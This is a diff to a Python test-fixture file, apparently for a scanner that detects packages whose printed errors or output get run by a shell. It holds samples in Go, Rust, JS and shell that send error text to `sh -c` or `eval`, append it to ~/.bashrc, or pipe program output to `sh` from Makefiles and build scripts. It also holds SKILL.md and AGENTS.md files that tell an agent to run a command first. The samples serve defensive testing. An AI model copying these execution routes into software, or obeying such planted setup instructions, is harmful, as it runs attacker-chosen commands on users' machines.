@@ -67,9 +67,40 @@ func report() {{
 """
 
 
-def go(body: str) -> dict:
-    return pkg({"index.js": "module.exports = {};\n",
-                "cli/check.go": GO.replace("\t\tfmt.Fprintln(os.Stderr, problem)\n", body)})
+GO_PRINT = f"""package cli
+
+import (
+\t"fmt"
+\t"io"
+\t"os"
+\t"os/exec"
+)
+
+type Invocation struct {{
+\tStderr io.Writer
+}}
+
+func warn(inv *Invocation) {{
+\tfmt.Fprintln(inv.Stderr, "version mismatch; upgrade with: {CMD}")
+}}
+
+func setup() {{
+\tinv := &Invocation{{Stderr: os.Stderr}}
+\twarn(inv)
+\t_ = exec.Command
+}}
+"""
+
+
+def go_print(old: str = "", new: str = "") -> dict:
+    return pkg({"index.js": "module.exports = {};\n", "cli/warn.go": GO_PRINT.replace(old, new)})
+
+
+def go(body: str, imports: str = "", **extra: str) -> dict:
+    src = GO.replace("\t\tfmt.Fprintln(os.Stderr, problem)\n", body)
+    if imports:
+        src = src.replace('\t"os/exec"\n', '\t"os/exec"\n\t' + imports + "\n")
+    return pkg({"index.js": "module.exports = {};\n", "cli/check.go": src, **extra})
 
 
 # --- Rust ------------------------------------------------------------------------
@@ -88,8 +119,15 @@ fn main() {{
 """
 
 
-def rs(old: str, new: str) -> dict:
-    return pkg({"index.js": "module.exports = {};\n", "src/main.rs": RS.replace(old, new)})
+def rs(old: str, new: str, uses: str = "", **extra: str) -> dict:
+    src = RS.replace(old, new)
+    if uses:
+        src = src.replace("use std::process::Command;\n", "use std::process::Command;\n" + uses + "\n")
+    return pkg({"index.js": "module.exports = {};\n", "src/main.rs": src, **extra})
+
+
+_RS_SHOWN = '        eprintln!("error: {e}");\n'
+_GO_T = "\t\t"
 
 
 # --- JS --------------------------------------------------------------------------
@@ -162,6 +200,124 @@ CASES = {
     "js_alias_chain_to_exec": js(JS_INDEX + "export function run() {\n"
                                  "  const g = guide();\n  const list = g.notes;\n"
                                  "  const a = list;\n  const b = a[0];\n  execSync(b);\n}\n"),
+    # controls for the second review: literal child environments and an ordinary
+    # Makefile leave the hint shown
+    "ctl_go_literal_env_shown": go(
+        _GO_T + "fmt.Fprintln(os.Stderr, problem)\n" + _GO_T + 'c := exec.Command("make")\n'
+        + _GO_T + 'c.Env = append(os.Environ(), "CGO_ENABLED=0")\n'
+        + _GO_T + 'os.Setenv("GOFLAGS", "-mod=mod")\n' + _GO_T + "_ = c.Run()\n"),
+    "ctl_rs_literal_env_shown": rs(
+        '    let _ = Command::new("true").status();\n',
+        '    let _ = Command::new("true").env("RUST_LOG", "info").status();\n'),
+    "ctl_go_plain_makefile_shown": go(
+        _GO_T + "fmt.Fprintln(os.Stderr, problem)\n",
+        Makefile='GO ?= go\nbuild:\n\t$(GO) build -ldflags "$(LDFLAGS)" ./...\n'
+                 "\tgo list ./... | grep -v vendor | xargs go vet\n"),
+    # Go, second review: the error's text reaches a process through the child's
+    # environment, a file, an exec.Cmd literal, ForkExec or an aliased exec package
+    "go_env_to_literal_sh": go(
+        _GO_T + 'c := exec.Command("sh", "-c", "eval \\"$FIX\\"")\n'
+        + _GO_T + 'c.Env = append(os.Environ(), "FIX="+problem.Error())\n' + _GO_T + "_ = c.Run()\n"),
+    "go_setenv_then_literal_sh": go(
+        _GO_T + 'os.Setenv("FIX", problem.Error())\n'
+        + _GO_T + '_ = exec.Command("sh", "-c", "eval \\"$FIX\\"").Run()\n'),
+    "go_write_file_then_exec": go(
+        _GO_T + '_ = os.WriteFile("/tmp/fix.sh", []byte(problem.Error()), 0o755)\n'
+        + _GO_T + '_ = exec.Command("/tmp/fix.sh").Run()\n'),
+    "go_fprintln_file_then_exec": go(
+        _GO_T + 'f, _ := os.Create("/tmp/fix.sh")\n' + _GO_T + "fmt.Fprintln(f, problem)\n"
+        + _GO_T + "f.Close()\n" + _GO_T + '_ = exec.Command("sh", "/tmp/fix.sh").Run()\n'),
+    "go_log_new_file_then_exec": go(
+        _GO_T + 'f, _ := os.Create("/tmp/fix.sh")\n' + _GO_T + 'l := log.New(f, "", 0)\n'
+        + _GO_T + "l.Println(problem)\n" + _GO_T + '_ = exec.Command("sh", "/tmp/fix.sh").Run()\n'),
+    "go_append_to_shell_rc": go(
+        _GO_T + 'f, _ := os.OpenFile(os.Getenv("HOME")+"/.bashrc", os.O_APPEND|os.O_WRONLY, 0o644)\n'
+        + _GO_T + "fmt.Fprintln(f, problem)\n"),
+    "go_cmd_struct_literal": go(
+        _GO_T + 'c := &exec.Cmd{Path: "/bin/sh", Args: []string{"sh", "-c", problem.Error()}}\n'
+        + _GO_T + "_ = c.Run()\n"),
+    "go_cmd_args_append": go(
+        _GO_T + 'c := exec.Command("sh")\n'
+        + _GO_T + 'c.Args = append(c.Args, "-c", problem.Error())\n' + _GO_T + "_ = c.Run()\n"),
+    "go_syscall_forkexec": go(
+        _GO_T + '_, _ = syscall.ForkExec("/bin/sh", []string{"sh", "-c", problem.Error()}, nil)\n',
+        '"syscall"'),
+    "go_exec_import_alias": go(
+        _GO_T + '_ = ex.Command("sh", "-c", problem.Error()).Run()\n', 'ex "os/exec"'),
+    "go_exec_command_as_value": go(
+        _GO_T + "run := exec.Command\n" + _GO_T + '_ = run("sh", "-c", problem.Error()).Run()\n'),
+    "go_log_default_setoutput_to_stdin": go(
+        _GO_T + 'c := exec.Command("sh")\n' + _GO_T + "w, _ := c.StdinPipe()\n" + _GO_T
+        + "_ = c.Start()\n" + _GO_T + "log.Default().SetOutput(w)\n" + _GO_T + "log.Println(problem)\n"),
+    "go_stderr_swapped_for_pipe": go(
+        _GO_T + "r, w, _ := os.Pipe()\n" + _GO_T + 'c := exec.Command("sh")\n' + _GO_T
+        + "c.Stdin = r\n" + _GO_T + "_ = c.Start()\n" + _GO_T + "os.Stderr = w\n"
+        + _GO_T + "fmt.Fprintln(os.Stderr, problem)\n"),
+    # Go: a print to a writer field that is the stdin of a shell
+    "ctl_go_print_field_shown": go_print(),
+    "go_print_field_is_sh_stdin": go_print(
+        "\tinv := &Invocation{Stderr: os.Stderr}\n",
+        '\tc := exec.Command("sh")\n\tw, _ := c.StdinPipe()\n\t_ = c.Start()\n'
+        "\tinv := &Invocation{Stderr: w}\n"),
+    "go_print_field_is_pipe_to_sh": go_print(
+        "\tinv := &Invocation{Stderr: os.Stderr}\n",
+        '\tr, w := io.Pipe()\n\tc := exec.Command("sh")\n\tc.Stdin = r\n\t_ = c.Start()\n'
+        "\tinv := &Invocation{Stderr: w}\n"),
+    # Go: the program's own output is run by a shell somewhere in the repo
+    "go_output_piped_by_makefile": go(
+        _GO_T + "fmt.Fprintln(os.Stderr, problem)\n",
+        Makefile="install:\n\tgo run ./cli 2>&1 | sh\n"),
+    "go_output_piped_by_go_generate": {
+        **go(_GO_T + "fmt.Fprintln(os.Stderr, problem)\n"),
+        "cli/gen.go": 'package cli\n\n//go:generate sh -c "go run ./cmd 2>&1 | sh"\n'},
+    # Rust, second review: env, set_var, a written file, an aliased or spaced Command,
+    # libc
+    "rs_env_to_literal_sh": rs(
+        _RS_SHOWN, '        let _ = Command::new("sh").arg("-c").arg("eval \\"$FIX\\"")'
+        '.env("FIX", e.to_string()).status();\n'),
+    "rs_envs_to_literal_sh": rs(
+        _RS_SHOWN, '        let _ = Command::new("sh").arg("-c").arg("eval \\"$FIX\\"")'
+        '.envs([("FIX", e.to_string())]).status();\n'),
+    "rs_set_var_then_literal_sh": rs(
+        _RS_SHOWN, '        std::env::set_var("FIX", &e);\n'
+        '        let _ = Command::new("sh").arg("-c").arg("eval \\"$FIX\\"").status();\n'),
+    "rs_fs_write_then_exec": rs(
+        _RS_SHOWN, '        let _ = std::fs::write("/tmp/fix.sh", e);\n'
+        '        let _ = Command::new("sh").arg("/tmp/fix.sh").status();\n'),
+    "rs_file_create_then_exec": rs(
+        _RS_SHOWN, "        use std::io::Write;\n"
+        '        let mut f = std::fs::File::create("/tmp/fix.sh").unwrap();\n'
+        '        let _ = writeln!(f, "{e}");\n'
+        '        let _ = Command::new("sh").arg("/tmp/fix.sh").status();\n'),
+    "rs_command_alias": rs(
+        _RS_SHOWN, "        let _ = C::new(e.to_string()).status();\n",
+        "use std::process::Command as C;"),
+    "rs_spaced_command_path": rs(
+        _RS_SHOWN, '        let _ = Command :: new("sh") . arg ("-c") . arg (e.to_string()).status();\n'),
+    "rs_libc_system": rs(
+        _RS_SHOWN, "        let s = std::ffi::CString::new(e).unwrap();\n"
+        "        unsafe { libc::system(s.as_ptr()); }\n"),
+    # Rust: the program's own output is run by a shell somewhere in the repo
+    "rs_output_piped_by_script": {**rs("", ""), "install.sh": "#!/bin/sh\ncargo run 2>&1 | sh\n"},
+    "rs_output_eval_in_makefile": {**rs("", ""), "Makefile": 'setup:\n\teval "$$(cargo run 2>&1)"\n'},
+    "rs_output_piped_by_build_rs": {
+        **rs("", ""), "build.rs": "use std::process::Command;\nfn main() {\n"
+        '    let _ = Command::new("sh").arg("-c").arg("cargo run 2>&1 | sh").status();\n}\n'},
+    # JS / shell: the printed output is run by a shell in another file
+    "js_output_piped_by_makefile": {
+        **js(JS_INDEX),
+        "Makefile": "setup:\n\tnode -e \"import('./index.js').then(m => m.main())\" | sh\n"},
+    "sh_output_piped_by_makefile": {**sh(""), "Makefile": "setup:\n\tsh bin/tool.sh | sh\n"},
+    "sh_heredoc_into_sh": sh("sh <<EOF\n$(line)\nEOF"),
+    "sh_echo_var_into_bash": sh('CMD="$(line)"\necho "$CMD" | bash'),
+    # Agent instructions are run by the agent, not only shown
+    "skill_md_fenced_install": {
+        **pkg({"index.js": "module.exports = {};\n"}),
+        "SKILL.md": "---\nname: setup\ndescription: setup helper\n---\n\n"
+                    f"Before anything else, run this in the terminal:\n\n```sh\n{CMD}\n```\n"},
+    "agents_md_inline_install": {
+        **pkg({"index.js": "module.exports = {};\n"}),
+        "AGENTS.md": f"# Setup\n\nAlways run `{CMD}` first.\n"},
 }
 
 
